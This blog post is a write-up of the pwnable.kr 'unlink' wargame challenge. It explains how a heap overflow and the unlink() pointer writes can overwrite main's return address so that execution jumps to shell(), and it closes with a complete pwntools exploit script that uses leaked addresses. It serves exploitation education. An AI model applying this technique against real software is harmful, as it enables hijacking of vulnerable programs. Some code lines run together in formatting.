---
layout: post
title: "Pwnable.kr writeup — unlink"
date: 2017-10-23 04:16:53 +0000
categories: blog
---

### Pwnable.kr writeup — unlink

This is another straight-forward challenge to practice heap overflow.

Read the source code, unlike the Unlink Me, this challenge actually provides a doubly-linked list in user memory and lets us to overflow it so that we don’t need to worry about glibc version. The idea is same, we still have to leverage the unlink() function to write arbitrary 4 bytes, that is, overwrite the return address of main() with the address of shell().

```
unlink()
```

```
main()
```

```
shell()
```

There are two possibilities for unlink():

1.

```
FD = return address of main()BK = address of shell()
```

Then BK->fd = FD will overwrite some code in shell()… Ouch! It should be read only…

```
BK->fd = FD
```

2.

```
FD = address of shell()BK = return address of main()
```

FD->bk = BK will do the same…

```
FD->bk = BK
```

It looks like we come to a dead end.

How about putting some writable memory there? Such as some heap address? Good idea, but unfortunately NX is turned on too! This doesn’t work either…

Fortunately this challenge is modified just for this purpose, there is some assembly code which is not as usual, it is those after unlink():

```
80485f2: e8 0d ff ff ff        call   8048504 <unlink> 80485f7: 83 c4 10              add    $0x10,%esp 80485fa: b8 00 00 00 00        mov    $0x0,%eax 80485ff: 8b 4d fc              mov    -0x4(%ebp),%ecx 8048602: c9                    leave   8048603: 8d 61 fc              lea    -0x4(%ecx),%esp 8048606: c3                    ret
```

The two instructions I highlight are not usual, they appear here just to help us to exploit… How could it help?

The %ebp-4 before leave is actually where the return address is! So it saves the return address we overwrite to %ecx, then deference it, sub 0x4 from it, then saves it back to the same place! What does this mean for us? This means we could put some writable address (heap address) which is the address of shell() address we save, we just leverage this additional dereference to bypass the additional write in unlink()!

```
%ebp-4
```

```
leave
```

```
%ecx
```

```
0x4
```

Now let’s review it:

%ebp-4 should contain the return address we overwrite via unlink(), as we plan above, it is a writable heap address where we save the address of shell(), then after the above unusual assembly code, the address of shell() should be overwritten as the return address of main() .

```
%ebp-4
```

```
unlink()
```

```
shell()
```

```
shell()
```

```
main()
```

So, here is our plan for overwriting OBJ B:

```
FD = address of shell() address we save on heapBK = return address of main()buf[0-4] = shell() address
```

So FD->bk is actually buf[4–8] which is now writable and we don’t care about what we write there. BK->fd is the return address.

```
FD->bk
```

```
buf[4–8]
```

```
BK->fd
```

The heap address printed is address of A, let’s examine what’s there in heap:

```
gdb-peda$ x/16wx 0x8e364100x8e36410: 0x08e36428 0x00000000 0x00000000 0x000000000x8e36420: 0x00000000 0x00000019 0x08e36440 0x08e364100x8e36430: 0x00000000 0x00000000 0x00000000 0x000000190x8e36440: 0x00000000 0x08e36428 0x00000000 0x00000000
```

Notice that those 0x08e3* are apparently addresses, so we can learn that A+24 = B, therefore B->buf is A+0x20, with adjust of 4 we need to set B->FD to A+0x24 . We already know the address of shell() is 0x80484eb . Lastly the return address of main should be the address of stack + 0x10 because A is stored at %ebp-0x14 on stack and %ebp is saved on stack too.

```
B->buf
```

```
B->FD
```

```
A+0x24
```

```
0x80484eb
```

```
%ebp-0x14
```

```
%ebp
```

The complete exploit code is:

```
from pwn import *s = ssh(host='pwnable.kr', port=2222,        user='unlink',        password='guest')context.log_level = 'debug'a = s.process(["./unlink"])r = a.recvuntil('get shell!\n')
```

```
stack_str = 'stack address leak: 'i = r.find(stack_str)stack_addr = int(r[i + len(stack_str) : i + len(stack_str) + 10], 16)
```

```
heap_str = 'heap address leak: 'i = r.find(heap_str)heap_addr = int(r[i + len(heap_str) : i + len(heap_str) + 10], 16)
```

```
shell_addr = 0x80484eb
```

```
a.send("AAAAAAAAPPPPCCCC" + p32(heap_addr + 0x24) + p32(stack_addr + 0x10) + p32(shell_addr))a.interactive()
```